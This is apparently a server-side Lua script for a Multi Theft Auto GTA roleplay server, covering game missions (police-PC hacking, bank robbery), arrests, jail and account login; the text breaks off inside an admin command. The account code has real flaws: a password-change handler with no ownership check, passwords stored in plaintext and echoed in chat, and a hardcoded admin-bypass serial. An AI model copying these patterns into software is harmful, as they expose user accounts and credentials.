--oj = createColSphere(1597.2, -1662, 1226.5, 1)

--------------------------------------------------------------------------------------------------------

--bgate = createObject(2634, 590.8, -1267.62, 1287.31, 0, 0, 270)
--SetElementInterior(bgate, 1) 
--------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------
hlspdpc = {}

addEvent("HPCF", true)
function FHPCF(PLR)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if hlspdpc[PLR] then
				hlspdpc[PLR] = nil
				setPedAnimationN(PLR, false)
				setElementFrozen(PLR, false)
				if isTimer(hackAnimTimer) then killTimer(hackAnimTimer) end
				triggerClientEvent(PLR, "onHackPc", PLR, false)
				local vT,vTT = {},{}
				for _, players in pairs(getElementsByType("player")) do
					if getPlayerTeam(players) == Police or players == PLR then
						table.insert(vT,players)
						vTT[players] = tlng[plng[players]][9]
						exports["guimessages"]:outputServer(players,vTT[players],255,0,0)
					end
				end
				notification(root, 'r', 'hack', 'r', vTT)
			end
		end
	end
end
addEventHandler("HPCF", resourceRoot, FHPCF)

FXML = xmlLoadFile("Houses.xml")
if not FXML then
	FXML = xmlCreateFile("Houses.xml","root")
	DXML = xmlCreateChild(FXML,"DHD")
	PXML = xmlCreateChild(FXML,"PHD")
	HXML = xmlCreateChild(FXML,"AHD")
	xmlNodeSetValue(DXML,419)
else
	if xmlFindChild(FXML,"DHD",0) then
		DXML = xmlFindChild(FXML,"DHD",0)
	else
		DXML = xmlCreateChild(FXML,"DHD")
		xmlNodeSetValue(DXML,419)
	end
	if xmlFindChild(FXML,"PHD",0) then
		PXML = xmlFindChild(FXML,"PHD",0)
	else
		PXML = xmlCreateChild(FXML,"PHD")
	end
	if xmlFindChild(FXML,"AHD",0) then
		HXML = xmlFindChild(FXML,"AHD",0)
	else
		HXML = xmlCreateChild(FXML,"AHD")
	end
	for k,v in pairs(getElementsByType("pickup")) do
		if getElementModel(v) == 1273 then
			NORR = xmlFindChild(HXML,"h"..getElementID(v),0)
			if NORR then
				HSPCT = getElementData(v,"HSPC")
				HSPCT[3] = tonumber(xmlNodeGetValue(NORR))
				setElementData(v,"HSPC",HSPCT)
			end
		end
	end
end

robank = nil
bag = createObject(1550, 0, 0, 0)
rul = createObject(1872, 0, 0, 0)
setElementDoubleSided(bag, true)
setElementDoubleSided(rul, true)
--@--setElementData(bag, "Wrestlers", 0)
setElementData(bag, "HAC", 0)
setElementData(bag, "WAC", 0)

if xmlNodeGetValue(DXML) then
	setElementData(bag,"Days",tonumber(xmlNodeGetValue(DXML)))
else
	setElementData(bag,"Days",419)
	xmlNodeSetValue(DXML,419)
end
xmlSaveFile(FXML)

addEvent("TOCJ", true)
function OCJ(PLR,ojj,dbank,robbank,bagm)--,arga
	--outputDebugString("server: OCJ")
	if client then--and not arga 
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		if ojj then
		  if getElementData(PLR,"Stats") == 3 then setElementData(PLR,"Stats",-1) setElementData(PLR, "WantLvl",6) end
			if not hacked then
				hacked = true
				setTimer(function() hacked = nil end, 600000, 1)
				gpwantl = getElementData(PLR, "WantLvl")
				if gpwantl < 3 then
					setElementData(PLR, "WantLvl", gpwantl+3)
				else
					setElementData(PLR, "WantLvl", 6)
				end
				--hlspdpc[PLR] = setTimer(HPC, 60000, 1, PLR)
				hlspdpc[PLR] = true
				triggerClientEvent(PLR, "onHackPc", PLR, true)
				setElementFrozen(PLR, true)
				setElementPosition(PLR, 1532.68726,-1657.50586,78.5)
			    setElementRotation(PLR, 0,0,180)
			    setPedAnimation(PLR, "INT_OFFICE", "OFF_Sit_Type_Loop", -1, true, false)
			    setElementData(PLR, "Task", "TASK_SIMPLE_NAMED_ANIM")
				local vTT = {}
				vTT[PLR] = tlng[plng[PLR]][10]
				exports["guimessages"]:outputServer(PLR,vTT[PLR],255,0,0)
				notification(PLR, 'y', 'hack', 'y',vTT)
				hackAnimTimer = setTimer(function(PLR)
					if isElement(PLR) then
						if getElementData(PLR, "Task") ~= "TASK_SIMPLE_NAMED_ANIM" then
							setPedAnimationN(PLR, "INT_OFFICE", "OFF_Sit_Type_Loop", -1, true, false)
						end
					else
						if isTimer(hackAnimTimer) then killTimer(hackAnimTimer) end
					end
				end, 100, 0, PLR)
				local vT = {}
				vTT = {}
				for _, players in pairs(getElementsByType("player")) do
					if getPlayerTeam(players) == Police then
						table.insert(vT,players)
						vTT[players] = tlng[plng[players]][12]..''..getPlayerName(PLR)..''..tlng[plng[players]][13]
						exports["guimessages"]:outputServer(players, tlng[plng[players]][11], 255, 0, 0)
						exports["guimessages"]:outputServer(players, vTT[players], 255, 0, 0)
					end
				end
				notification(root, 'r', 'hack', 'r',vTT)
			else
				exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][14], 255, 255, 0)
			end
		elseif dbank then 
			if not robank then
				setElementData(bag, "RBANK", 0)
				robank = true
				ttb = true
				rbp = PLR
				setTimer(function() robank = nil
						rbp = nil
						str = nil
						bagr = nil
						rbank1 = nil
						rbank2 = nil
						rbank3 = nil
						rbank4 = nil
						rbank5 = nil
						rbank6 = nil
						rbank7 = nil
						rbank8 = nil
						moveObject(bgate,3000,590.8,-1267.62,1287.31)
					end,60000*13,1)
				setTimer(FTRB,60000*7,1)
				strt = setTimer(function() str = true
						strt = nil
						triggerClientEvent(rbp, "SSafes", rbp)
						moveObject(bgate, 3000, 590.8, -1266, 1287.31)
					end, 10000, 1)
				gpwanl = getElementData(PLR,"WantLvl")
				if gpwanl < 3 then
					setElementData(PLR, "WantLvl", gpwanl+3)
				else
					setElementData(PLR, "WantLvl", 6)
				end
				local vTT = {}
				vTT[PLR] = tlng[plng[PLR]][15]
				exports["guimessages"]:outputServer(PLR, vTT[PLR], 255, 0, 0)
				notification(PLR, 'y', 'br', 'y',vTT)
				triggerClientEvent(rbp, "dbanim", rbp)
				local vT = {}
				vTT = {}
				for _, players in pairs(getElementsByType("player")) do
					--if getPlayerTeam(players) == Police then
					if players ~= PLR then
						table.insert(vT,players)
						vTT[players] = (tlng[plng[players]][16] or "*Report from Bank: " )..''..getPlayerName(PLR)..''..(tlng[plng[players]][17] or " is Attempting to rob the bank!" ) 
						exports["guimessages"]:outputServer(players, tlng[plng[players]][11], 255, 0, 0)
						exports["guimessages"]:outputServer(players, vTT[players], 255, 0, 0)
					end
				end
				notification(root, 'r', 'br', 'r',vTT)
			elseif rbp ~= PLR then
				exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][18], 255, 255, 0)
			end 
		elseif robbank == 1 then
			if rbp == PLR then
				if not rbank1 then
					rbb = 1
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank1 = true
				end
			end
		elseif robbank == 2 then
			if rbp == PLR then
				if not rbank2 then
					rbb = 2
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank2 = true
				end
			end
		elseif robbank == 3 then
			if rbp == PLR then
				if not rbank3 then
					rbb = 3
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank3 = true
				end
			end
		elseif robbank == 4 then
			if rbp == PLR then
				if not rbank4 then
					rbb = 4
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank4 = true
				end
			end
		elseif robbank == 5 then
			if rbp == PLR then
				if not rbank5 then
					rbb = 5
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank5 = true
				end
			end
		elseif robbank == 6 then
			if rbp == PLR then
				if not rbank6 then
					rbb = 6
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank6 = true
				end
			end
		elseif robbank == 7 then
			if rbp == PLR then
				if not rbank7 then
					rbb = 7
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank7 = true
				end
			end
		elseif robbank == 8 then
			if rbp == PLR then
				if not rbank8 then
					rbb = 8
					triggerClientEvent("rbanim",resourceRoot, rbp, rbb)
					setElementData(bag, "RBANK", getElementData(bag, "RBANK")+1)
					rbank8 = true
				end
			end
		end
		if ttb then
			if robbank or bagm then
				if str and not bagr then
					rbp = PLR
					bagr = true

					bint = getElementInterior(PLR)
					bdim = getElementDimension(PLR)
					SetElementInterior(bag, bint)
					SetElementDimension(bag, bdim)
					SetElementInterior(rul, bint)
					SetElementDimension(rul, bdim)
					if not exports.bone_attach:isElementAttachedToBone(bag) then
						exports.bone_attach:attachElementToBone(bag, PLR, 3, 0, -.27, 0, 0, 0, 160)
						exports.bone_attach:attachElementToBone(rul, PLR, 3, 0, -.27, -.37)
					end
					if not rdotb then
						rdotb = createBlipAttachedTo(bag, 36)
					end
					if getPlayerTeam(PLR) == Police then
						triggerClientEvent("BTBTTB",resourceRoot, rbp, rbank1, rbank2, rbank3, rbank4, rbank5, rbank6, rbank7, rbank8)
					else
						setElementData(PLR, "WantLvl", 6)
						triggerClientEvent("SafesM",resourceRoot, rbp, rbank1, rbank2, rbank3, rbank4, rbank5, rbank6, rbank7, rbank8)
					end
				end
			end
		end
	end
end
addEventHandler("TOCJ", resourceRoot, OCJ)

function SBID()
	if rbp == source then
		bint = getElementDimension(source)
		bdim = getElementInterior(source)
		SetElementInterior(bag, bint)
		SetElementDimension(bag, bdim)
		SetElementInterior(rul, bint)
		SetElementDimension(rul, bdim)
	end
end
addEventHandler("onPlayerMarkerLeave", root, SBID)

addEvent("DBFR", true)
function FDBFR(PLR,x, y, gz)
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		exports.bone_attach:detachElementFromBone(bag)
		exports.bone_attach:detachElementFromBone(rul)
		if gz then
			SetElementPosition(bag, x, y, gz+.4)
			SetElementPosition(rul, x, y, gz+.03)
		end
		setElementRotation(bag, 0, 0, 0)
		setElementRotation(rul, 0, 0, 0)
		bagr = nil
		rbp = nil
		triggerClientEvent("DropB", resourceRoot, x, y, gz)
	end
end
addEventHandler("DBFR", resourceRoot, FDBFR)

addEvent("Rbag", true)
function FRbag(PLR)
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		exports.bone_attach:detachElementFromBone(bag)
		exports.bone_attach:detachElementFromBone(rul)
		SetElementPosition(bag,0,0,0)
		SetElementPosition(rul,0,0,0)
		if rbp == PLR and getPlayerTeam(rbp) == Police then
			exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][30]..'6000'..tlng[plng[PLR]][31], 0, 255, 0)
			local vTT = {}
			vTT[PLR] = {"+100 Bag Return"}
			--arga = getElementData(PLR,"PXP")+60
			OPLU(PLR,"PXP","PLVL",getElementData(PLR,"PXP")+100)--"PLVL",arga)
			triggerClientEvent(PLR,"OPEC",PLR,vTT)
		end
		rbp = nil
		ttb = nil
		if rdotb then
			destroyElement(rdotb)
			rdotb = nil
		end
	end
end
addEventHandler("Rbag", resourceRoot, FRbag)

function HPC(PLR)
	--outputDebugString("server: HPC")
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		hlspdpc[PLR] = nil
		lspdh = true
		setTimer(function() lspdh = nil end, 30000, 1)
		setElementData(PLR, "WantLvl", 6)
		arga = getElementData(PLR,"GXP")+70
			OPLU(PLR,"GXP","GLVL",arga)
		setPedAnimationN(PLR, false)
		setElementFrozen(PLR, false)
		if isTimer(hackAnimTimer) then killTimer(hackAnimTimer) end
		--triggerClientEvent(PLR,"xHackPcDonex",PLR)
		triggerClientEvent(PLR, "onHackPc", PLR, false)
		local vTT = {}
		vTT[PLR] = tlng[plng[PLR]][19]
		exports["guimessages"]:outputServer(PLR, vTT[PLR], 0, 255, 0)
		notification(PLR, 'g', 'hack', 'g',vTT)
		for _, players in pairs(getElementsByType("player")) do
			if getPlayerTeam(players) == Police then
				exports["guimessages"]:outputServer(players, tlng[plng[players]][11], 255, 0, 0)
				exports["guimessages"]:outputServer(players, tlng[plng[players]][20]..''..getPlayerName(PLR)..''..tlng[plng[players]][21], 255, 0, 0)
			elseif getElementData(players, "Stats") > 2 then
				exports["guimessages"]:outputServer(players, tlng[plng[players]][22]..''..getPlayerName(PLR)..''..tlng[plng[players]][23], 255, 255, 0)
				if getPlayerTeam(players) == getPlayerTeam(PLR) and getPlayerTeam(PLR) ~= NoTeam then
					--[[Mplayer = PLR
					reward = 500
					rscore = 2
					triggerClientEvent(PLR, "GPM", PLR, Mplayer, reward, rscore)]]
					setElementData(PLR, "Money", getElementData(PLR, "Money")+500)
					givePlayerScore (PLR,2)
					--setElementData(PLR, "Scores", getElementData(PLR, "Scores")+2)
				else
					--[[Mplayer = PLR
					reward = 200
					rscore = 1
					triggerClientEvent(PLR, "GPM", PLR, Mplayer, reward, rscore)]]
					setElementData(PLR, "Money", getElementData(PLR, "Money")+200)
					--setElementData(PLR, "Scores", getElementData(PLR, "Scores")+1)
					givePlayerScore (PLR,1)
				end
			end
		end
	end
end
addEvent("onHackPcComplete", true)
addEventHandler("onHackPcComplete", resourceRoot, HPC)




addEvent("OMH", true)
function FOMH(PLR)
	--outputDebugString("server: FOMH")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if rbp == PLR and str then
				rbp = nil
				ttb = nil
				local brobbed = getElementData(bag, "RBANK")
				local rmoney,vTT = brobbed*8000+math.random(4000),{}
				if brobbed > 8 then
					brobbed = 8
				end 
				setElementData(PLR,"Money",getElementData(PLR, "Money")+rmoney)
				--setElementData(PLR, "Scores", getElementData(PLR, "Scores")+brobbed)
				vTT[PLR] = tlng[plng[PLR]][24]..''..rmoney..''..tlng[plng[PLR]][25]
				exports["guimessages"]:outputServer(PLR, vTT[PLR], 0, 255, 0)
				triggerClientEvent(PLR,"Tcheckntf", PLR, 'g', 'br', 'g', vTT,PLR)
				setElementData(bag, "RBANK", 0)
				
				local money2 = rmoney/(#getElementsByType("player")-1)
				for _, players in pairs(getElementsByType("player")) do
					exports["guimessages"]:outputServer(players, tlng[plng[players]][26]..''..getPlayerName(PLR)..''..tlng[plng[players]][27]..''..rmoney..''..tlng[plng[players]][28],255,0,0)  
				end
				if rdotb then
					destroyElement(rdotb)
					rdotb = nil
				end
				exports.bone_attach:detachElementFromBone(bag)
				exports.bone_attach:detachElementFromBone(rul)
				setElementPosition(bag, 0, 0, 0)
				setElementPosition(rul, 0, 0, 0)
			end
		end
	end
end
addEventHandler("OMH", resourceRoot, FOMH)

function FTRB()
	--outputDebugString("server: FTRB")
	for _, players in pairs(getElementsByType("player")) do
		if rbp == players then
			rbp = nil
			if getPlayerTeam(players) ~= Police then
				exports["guimessages"]:outputServer(players, tlng[plng[players]][29], 255, 0, 0)
			end
			FRbag(players)
			triggerClientEvent("CROB",players)
			break
		end
	end
end

addEvent("PIJ", true)
function PPIJ(PLR, cop)
	--outputDebugString("server: PPIJ")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			--outputChatBox("PPIJ")
			if getElementData(PLR,"Stats") ~= 3 then
				local WLP,WLPM = getElementData(PLR, "WantLvl"),getElementData(PLR, "WantLvl")*500
				--[[Mplayer = cop
				reward = WLPM
				rscore = WLP*2
				triggerClientEvent(cop, "GPM", cop, Mplayer, reward, rscore)]]
				if OPE[tostring(getElementData(cop,"ID"))]["ARAssist"][1] then
					local vT,vTT,arga = {},{}
				  for k,v in pairs(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"]) do
					if isElement(v) then  
						if getPlayerTeam(v) and getPlayerTeam(v) == Police then
							if v == cop then
								vTT[v] = {"+20 Arrest"}
								arga = getElementData(v,"PXP")+20
							else
								vTT[v] = {"+10 Arrest Assist"}
								arga = getElementData(v,"PXP")+10
							end
							OPLU(v,"PXP","PLVL",arga)
							table.insert(vT,v)
						end
					end	
				  end
					--OPLU(k,Karga,Kargb,arga)
					--local next = next
					if not table.empty(vT) then
						triggerClientEvent(vT,"OPEC",resourceRoot,vTT)
					end
					OPE[tostring(getElementData(cop,"ID"))]["ARAssist"] = {}
					
				end
				setElementData(cop, "Money", getElementData(cop, "Money")+WLPM)
				--setElementData(cop, "Scores", getElementData(cop, "Scores")+(WLP*2))
				givePlayerScore (cop,WLP*2)
				setElementData(PLR, "WantLvl", 0)
				setElementData(PLR, "Stats", 3)
				setElementData(cop, "Prisoners", 0)
				setElementData(PLR, "SDG", 0)
				setElementData(PLR, "MDG", 0)
				setElementData(PLR, "EDG", 0)
				toggleControl(PLR, "fire", true)
				toggleControl(PLR, "jump", true)
				setPedFightingStyle(PLR, 15)
				--setPedWeaponSlot(PLR, 0)
				--SetElementInterior(PLR, 1)
				--player = cop
				exports["guimessages"]:outputServer(cop, tlng[plng[cop]][30]..''..WLPM..''..tlng[plng[cop]][31], 0, 255, 0)
				--OCJ(cop,nil,nil,nil,nil,nil,nil,nil,true)
				setControlState(cop,"action",true)
				setTimer(function(cop) setControlState(cop,"action",true) end,50,1,cop)
			end
		end
	end
end
addEventHandler("PIJ", resourceRoot, PPIJ)

addEvent("SSPTJ", true)
function SPTJ(PLR,prsnr,cop)
	--outputDebugString("server: SPTJ")
    if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
		if not fake then
			if getElementData(prsnr,"Stats") ~= 3 then
				WLP = getElementData(prsnr, "WantLvl")
				WLPM = WLP*200
				if OPE[tostring(getElementData(cop,"ID"))]["ARAssist"][1] then
					local vT,vTT = {},{}
					for k,v in pairs(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"]) do
					  if not isElement(v) then return end -- nu9aif
						if getPlayerTeam(v) == Police then
							if v == cop then
								vTT[v] = {"+20 Arrest"}
								arga = getElementData(v,"PXP")+20
							else
								vTT[v] = {"+10 Arrest Assist"}
								arga = getElementData(v,"PXP")+10
							end
							OPLU(v,"PXP","PLVL",arga)
							table.insert(vT,v)
						end
					end
					--OPLU(k,Karga,Kargb,arga)
					--local next = next
					if not table.empty(vT) then
						triggerClientEvent(vT,"OPEC",resourceRoot,vTT)
					end
					OPE[tostring(getElementData(cop,"ID"))]["ARAssist"] = {}
				end
				exports["guimessages"]:outputServer(cop,tlng[plng[cop]][30]..''..WLPM..''..tlng[plng[cop]][31],0,255,0)
				setElementData(cop,"Money",getElementData(cop, "Money")+WLPM)
				PPIJOW(PLR,prsnr)
				--[[Mplayer = cop
				reward = WLPM
				rscore = WLP
				triggerClientEvent(cop, "GPM", cop, Mplayer, reward, rscore)]]
				--setElementData(cop, "Scores", getElementData(cop, "Scores")+WLP)
				givePlayerScore (cop,WLP)
				--jailer = prsnr
				--outputChatBox("2- " ..getPlayerName(prsnr))
				triggerClientEvent(prsnr,"CPIJ",prsnr)
				setElementData(cop,"Prisoners",0)
				--outputChatBox("1"..getPlayerName(prsnr),root)
			end
		end 
end
addEventHandler("SSPTJ", resourceRoot, SPTJ)

addEvent("PPIJOPW", true)
function PPIJOW(PLR,prsnr,model,team,iSpawn)--arga
	--outputDebugString("server: PPIJOW")
	
        --outputChatBox("4- " ..getPlayerName(prsnr))
	if client then--and not arga
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		if iSpawn then
			spawnPlayer(prsnr, 0, 0, 0, 0, model, 0, 0, team)
			if Medic == team then
				giveWeapon(prsnr, 41, 999999)
				--giveWeapon(prsnr, 41, 999999)
			end
		elseif isPedInVehicle(prsnr) then
			removePedFromVehicle(prsnr)
		end
		if not getPlayerTeam(prsnr) then
			setPlayerTeam(prsnr,team)
		end 
		
        --outputChatBox("5- " ..getPlayerName(prsnr))
		setCameraTarget(prsnr)
		setElementInterior(prsnr,200)
		setElementDimension(prsnr,200)
		setCameraInterior(prsnr,200)
		setPedFightingStyle(prsnr,15)
		setElementData(prsnr,"Stats",3)
		--outputChatBox("2"..getPlayerName(prsnr),root)
		setElementData(prsnr,"WantLvl",0)
		setElementData(prsnr,"SDG",0)
		setElementData(prsnr,"MDG",0)
		setElementData(prsnr,"EDG",0)
		--setPedWeaponSlot(prsnr, 0)
		toggleControl(prsnr,"fire",true)
		toggleControl(prsnr,"jump",true)
		toggleControl(prsnr,"enter_exit",true)
		toggleControl(prsnr,"next_weapon",false)
		toggleControl(prsnr,"previous_weapon",false)

		JailPossition(PLR,prsnr) 
	end
end
addEventHandler("PPIJOPW", resourceRoot, PPIJOW)

addEvent("ReVehicleJail", true)
addEventHandler("ReVehicleJail", resourceRoot,
function(PLR)--,city
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			removePedFromVehicle(PLR)
			JailPossition(PLR,PLR)
		end
	end
end)


addEvent("BAIL", true)
function JTF(PLR, bail)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			setElementData(PLR, "Stats", 0)
			setElementData(PLR, "WantLvl", 0)
            setElementPosition(PLR,1554.4,-1668,84.7)
			setElementInterior(PLR,200)
			setElementDimension(PLR,200)
			setElementHealth(PLR,200)
			toggleControl(PLR, "next_weapon", true)
			toggleControl(PLR, "previous_weapon", true)
		end
	end
end
addEventHandler("BAIL", resourceRoot, JTF)

addEvent("BAIL2", true)
function JTF2(player)
    local PLR = source
    setElementData(PLR, "Stats", 0)
    setElementData(PLR, "WantLvl", 0)
    outPutDxChat("Bail was paid by "..getPlayerName(player).." ($12,000) .",PLR,0,255,0) 
    setElementPosition(PLR,1554.4,-1668,84.7)
    setElementInterior(PLR,200)
    setElementDimension(PLR,200)
	setElementHealth(PLR,200)
    toggleControl(PLR, "next_weapon", true)
    toggleControl(PLR, "previous_weapon", true)
end
addEventHandler("BAIL2", root, JTF2)

addEvent("JailEscape", true)
function Jescape(PLR, bc1, bc2)
	--outputDebugString("server: Jescape")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if not lspdh then 
			end
			setElementData(PLR, "WantLvl", 6)
			setElementData(PLR, "Stats", 0)
			toggleControl(PLR, "next_weapon", true)
			toggleControl(PLR, "previous_weapon", true)
			triggerClientEvent("SSiren",resourceRoot)
			local vT,vTT = {},{}
			for _, players in pairs(getPlayersInTeam(Police)) do
				--if getPlayerTeam(players) == Police then
					table.insert(vT,players)
					vTT[players] = tlng[plng[players]][32]..''..getPlayerName(PLR)..''..tlng[plng[players]][33]
					--exports["guimessages"]:outputServer(players, wrntext[players], 255, 0, 0)
					exports["guimessages"]:outputServer(players, vTT[players], 255, 0, 0)
					if bc1 and badcop1 then
						exports["guimessages"]:outputServer (players, tlng[plng[players]][34]..''..getPlayerName(badcop1)..''..tlng[plng[players]][35], 255, 0, 0)
						
					elseif bc2 and badcop2 then
						exports["guimessages"]:outputServer (players, tlng[plng[players]][34]..''..getPlayerName(badcop2)..''..tlng[plng[players]][35], 255, 0, 0)
					end
				--end
			end
			notification(root, 'r', 'je', 'r',vTT) 
		end
	end
end
addEventHandler("JailEscape", resourceRoot, Jescape)

addEvent("OFFTICK", true)
function offerT(cop, players)
	if client then
		CICTC(eventName,source,cop)
		if not fake then
			local vT,arga = {}
			for k,v in pairs(players) do
				if getElementData(v,"WantLvl") > 0 then
					table.insert(vT,v)
					arga = tlng[plng[cop]][36]..''..getPlayerName(v)..''..tlng[plng[cop]][37]
					exports["guimessages"]:outputServer (cop, arga, 0, 0, 255)
					setElementData(v, "Stats", 1)
				end
			end
			if arga then
				local vTT = {}
				vTT[cop] = arga
				notification(cop, 'y', 'tk', 'y', vTT)
				triggerClientEvent(vT,"BKPT",resourceRoot,cop)--(players,"BKPT"
			end
		end
	end
end
addEventHandler("OFFTICK", resourceRoot, offerT)

addEvent("TCHANCE", true)
function TICKCHA(PLR)
	--outputDebugString("server: TICKCHA")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if getElementData(PLR, "WantLvl") == 1 then
				setElementData(PLR, "WantLvl", 2)
			elseif getElementData(PLR, "WantLvl") == 2 then
				setElementData(PLR, "WantLvl", 3)
				setElementData(PLR, "Stats", 0)
			end
		end
	end
end
addEventHandler("TCHANCE", resourceRoot, TICKCHA)

addEvent("PTick", true)
function PTTC(PLR, tcop)
	--outputDebugString("server: PTTC")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			--rscore = false
			if getElementData(PLR, "WantLvl") == 1 then
				--Mplayer = tcop
				reward = 200
				setElementData(tcop, "Money", getElementData(tcop, "Money")+200)
				--setElementData(tcop, "Scores", getElementData(tcop, "Scores")+1)
				givePlayerScore (tcop,1)
			elseif getElementData(PLR, "WantLvl") == 2 then
				reward = 500
				setElementData(tcop, "Money", getElementData(tcop, "Money")+500)
				--setElementData(tcop, "Scores", getElementData(tcop, "Scores")+2)
				givePlayerScore (tcop,2)
			end
			local vTT = {}
			vTT[tcop] = getPlayerName(PLR)..''..tlng[plng[tcop]][38]..''..reward..''..tlng[plng[tcop]][39]
			exports["guimessages"]:outputServer(tcop, vTT[tcop], 0, 255, 0)
			notification(tcop, 'g', 'tk', 'g', vTT)
			vTT = {}
			vTT[PLR] = ""
			notification(PLR, 'g', 'tk', 'g', vTT)
			setElementData(PLR, "WantLvl", 0)
			setElementData(PLR, "Stats", 0)
		end
	end
end
addEventHandler("PTick", resourceRoot, PTTC)

----------------------------------------------------
addEvent("getAccountInformation", true)
addEventHandler("getAccountInformation", root, function()
	if client then 
	    local PLR = source 
		local serial = getPlayerSerial(PLR)
		local accounts = getAccountsBySerial(serial)		
			if #accounts == 0 then 
				setElementData ( PLR, "playerAccountLogin", "NoAcc" )
			else
                local vTT = {}
			    for i,v in ipairs (accounts) do 
                    table.insert(vTT,getAccountName(v))
			    end 
				setElementData ( PLR, "playerAccountLogin", vTT )			
            end 
	end
end)

addEventHandler("onPlayerChangeNick", getRootElement(), 
function ()
     if (getElementData(source,"AviableTime") or 0 ) >= 15 then
	 else
		cancelEvent()
	 end	
end
)

function loginPlayer( username,password,is ) 
	if client then 
	    local PLR = source
		local acc = getAccount(username)
		if not acc then return end
		if is then
		    if getAccountSerial(acc) ~= getPlayerSerial(PLR) then
		       triggerClientEvent(PLR,"setTextPass",PLR,"* Error! Wrong username and/or password!",1) 
			   return
			end
        end
		if logIn (PLR, acc, password) then
			exports["guimessages"]:outputServer(PLR, "* You have sucessfully logged in!", 0 , 255, 0)
			loadacc(PLR,"Login",username,password)
			removeElementData ( PLR, "playerAccountLogin")   
		elseif is then
			triggerClientEvent(PLR,"setTextPass",PLR,"* Error! Wrong username and/or password!",1) 
		else
			triggerClientEvent(PLR,"setTextPass",PLR,"* Error! Wrong username and/or password!")
		end 
	end
end
addEvent("Gta-Ar:onRequestLogin",true)
addEventHandler("Gta-Ar:onRequestLogin",root,loginPlayer) 

function ChangePass( username,password ) 
	if client then 
	    local PLR = source
		local acc = getAccount (username)
		if not acc then return end
		setAccountPassword(acc,password)
        if logIn (PLR, acc, password) then
			exports["guimessages"]:outputServer(PLR, "* You have sucessfully logged in!", 0 , 255, 0)
			loadacc(PLR,"Login",username,password)
			removeElementData ( PLR, "playerAccountLogin")   
		else
			triggerClientEvent(PLR,"setTextPass",PLR,"* Error! Wrong username and/or password!")
		end 
	end
end
addEvent("Gta-Ar:onChangePassowrd",true)
addEventHandler("Gta-Ar:onChangePassowrd",root,ChangePass) 


function RegisterPlayer( username,password )
	if client then  
	    local player = source
		local serial = getPlayerSerial(player)
		local accounts = getAccountsBySerial(serial)
		local nickname = ""
            if #accounts == 0 then 
				if addAccount(tostring(username),tostring(password)) then
					exports["guimessages"]:outputServer(player, "* You have sucessfuly registered! [Username: " .. username .. " #| Password: " .. password .. "]", 255, 255, 255) 
					logIn (player, getAccount ( username, password ), password)
					loadacc(player,"Register",username,password) 
					removeElementData ( player, "playerAccountLogin")    
					dbExec(db, "INSERT INTO Accounts VALUES(?, ?, ?,?)", username, password,nickname,getPlayerSerial(player)) 
				else
				    triggerClientEvent(player,"setTextPass",player,"* Error! username wrong!")
				end
			else
			    triggerClientEvent(player,"setTextPass",player,"* Error! Wrong Tell Admi for this!") 
            end
	end
end
addEvent("Gta-Ar:onRequestRegister",true)
addEventHandler("Gta-Ar:onRequestRegister",root,RegisterPlayer)


 
 

login = {}

function loadacc(PLR,value,user,pass)
	if not login[PLR] then
		login[PLR] = true 
		SAC = GADJ(getPlayerAccount(PLR),"SAC")
		if SAC then
			SAC = fromJSON(SAC)
			if SAC[1][3] then
				setElementData(PLR,"MBail",SAC[1][3])
			end
			if SAC[1][4] then
				setElementData(PLR,"Mins",SAC[1][4])
			end
			if SAC[1][5] then
				setElementData(PLR,"Secs",SAC[1][5])
			end
		end
		triggerClientEvent(PLR, "onLI", PLR,DCPM, bag, rul,value,SAC[1][5],SAC[1][4],SAC[1][3],ChampionsValue,Champions2Value,user,pass)
		--triggerClientEvent("COAJT", PLR)
		if not rbp then
			x, y, z = getElementPosition(bag)
			triggerClientEvent("DropB", PLR, x, y, z)
		end
		LCPH(PLR)
		SAC = nil
	end
end

addEventHandler("onPlayerQuit", root, function() login[source] = nil end)


function cmdtest (PLR,cmd,...)
	local vTT = {}
	vTT[PLR] = table.concat({...}, " ")
	notification(PLR, 'g', 'hack', 'g',vTT)
end
--addCommandHandler("ttt",cmdtest)

addCommandHandler ( "WarpAll", 
function (Player,cmd,num)
 local serial = getPlayerSerial(Player)
  if isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(Player)),aclGetGroup("Admin")) 
  or  isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(Player)),aclGetGroup("Leader")) or serial == "Your_Serial" then
       if num == "1" then
	     ChampionsT = "Champions"
	   else
	     ChampionsT = "Champions2"
	   end
  
   if ChampionsValue == "OFF" and num then
     for k, v in ipairs(getElementsByType("player")) do
